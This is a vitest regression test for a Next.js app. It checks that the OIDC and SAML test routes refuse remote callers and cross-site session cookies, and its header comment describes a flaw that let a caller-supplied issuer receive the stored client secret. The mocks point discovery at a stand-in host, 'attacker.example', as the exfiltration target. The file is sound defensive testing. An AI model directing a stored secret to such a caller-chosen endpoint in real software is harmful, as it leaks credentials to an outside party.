/**
 * POST /api/auth/oidc/test and /api/auth/saml/test authenticate with the guard's rules.
 *
 * Both sit under a PUBLIC guard prefix (/api/auth/oidc, /api/auth/saml — start, callback
 * and acs must be reachable without a session), so each route checked access itself,
 * with a copy of the rules that had drifted:
 *   if (settings.requireLogin === false) return true;   // from ANY peer
 *   ...cookie check without the cross-site refusal
 * The guard honours requireLogin=false for loopback only, and refuses the session cookie
 * on cross-site requests. The OIDC test route fetches discovery from a caller-supplied
 * issuer and POSTs the STORED client secret to the token_endpoint that discovery names,
 * so with login disabled any remote caller could have the secret sent to their server.
 */

import { describe, it, expect, vi, beforeEach } from "vitest";

const mocks = vi.hoisted(() => ({
  getSettings: vi.fn(),
  validateApiKey: vi.fn(),
  getConsistentMachineId: vi.fn(async () => "cli-token"),
  verifyDashboardAuthToken: vi.fn(),
  fetchOidcDiscovery: vi.fn(async () => ({ token_endpoint: "https://attacker.example/token" })),
  probeOidcClientSecret: vi.fn(async () => ({ ok: true })),
}));

vi.mock("next/server", () => ({
  NextResponse: {
    json: (body, init) => ({ status: init?.status || 200, body }),
    next: vi.fn(),
    redirect: vi.fn(),
  },
}));
vi.mock("@/lib/localDb", () => ({ getSettings: mocks.getSettings, validateApiKey: mocks.validateApiKey }));
vi.mock("@/shared/utils/machineId", () => ({ getConsistentMachineId: mocks.getConsistentMachineId }));
vi.mock("@/lib/auth/dashboardSession", () => ({ verifyDashboardAuthToken: mocks.verifyDashboardAuthToken }));
vi.mock("@/lib/auth/oidc", () => ({
  fetchOidcDiscovery: mocks.fetchOidcDiscovery,
  probeOidcClientSecret: mocks.probeOidcClientSecret,
  getPublicOrigin: () => "http://localhost:20128",
}));
vi.mock("@/lib/auth/saml.js", () => ({ formatX509Certificate: (c) => c }));

const oidc = await import("../../src/app/api/auth/oidc/test/route.js");
const saml = await import("../../src/app/api/auth/saml/test/route.js");

const PEER_TOKEN = "peer-token-fixture";

function request({ peer = "127.0.0.1", cookie = false, site } = {}) {
  const headers = new Headers({ "x-9r-peer-token": PEER_TOKEN, "x-9r-real-ip": peer });
  if (site) headers.set("sec-fetch-site", site);
  return {
    headers,
    cookies: { get: vi.fn((n) => (cookie && n === "auth_token" ? { value: "valid-session" } : undefined)) },
    json: async () => ({ issuerUrl: "https://attacker.example", clientId: "c", samlEntryPoint: "https://idp.example/sso" }),
    url: "http://localhost:20128/api/auth/oidc/test",
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  process.env.NINEROUTER_PEER_TOKEN = PEER_TOKEN;
  mocks.getSettings.mockResolvedValue({ requireLogin: true, oidcClientSecret: "stored-oidc-secret" });
  mocks.verifyDashboardAuthToken.mockImplementation(async (t) => t === "valid-session");
});

describe.each([
  ["oidc", () => oidc.POST],
  ["saml", () => saml.POST],
])("%s test route", (name, handler) => {
  it("requireLogin=false does not admit a remote peer", async () => {
    mocks.getSettings.mockResolvedValue({ requireLogin: false, oidcClientSecret: "stored-oidc-secret" });
    const res = await handler()(request({ peer: "203.0.113.7" }));
    expect(res.status).toBe(401);
    if (name === "oidc") {
      expect(mocks.fetchOidcDiscovery).not.toHaveBeenCalled();
      expect(mocks.probeOidcClientSecret).not.toHaveBeenCalled();
    }
  });

  it("the session cookie is refused on a cross-site request", async () => {
    const res = await handler()(request({ cookie: true, site: "cross-site" }));
    expect(res.status).toBe(401);
  });

  it("a valid session still gets through", async () => {
    const res = await handler()(request({ peer: "203.0.113.7", cookie: true, site: "same-origin" }));
    expect(res.status).not.toBe(401);
  });

  it("requireLogin=false still admits a loopback caller", async () => {
    mocks.getSettings.mockResolvedValue({ requireLogin: false, oidcClientSecret: "stored-oidc-secret" });
    const res = await handler()(request());
    expect(res.status).not.toBe(401);
  });

  it("no session and login required: refused", async () => {
    expect((await handler()(request({ peer: "203.0.113.7" }))).status).toBe(401);
  });
});
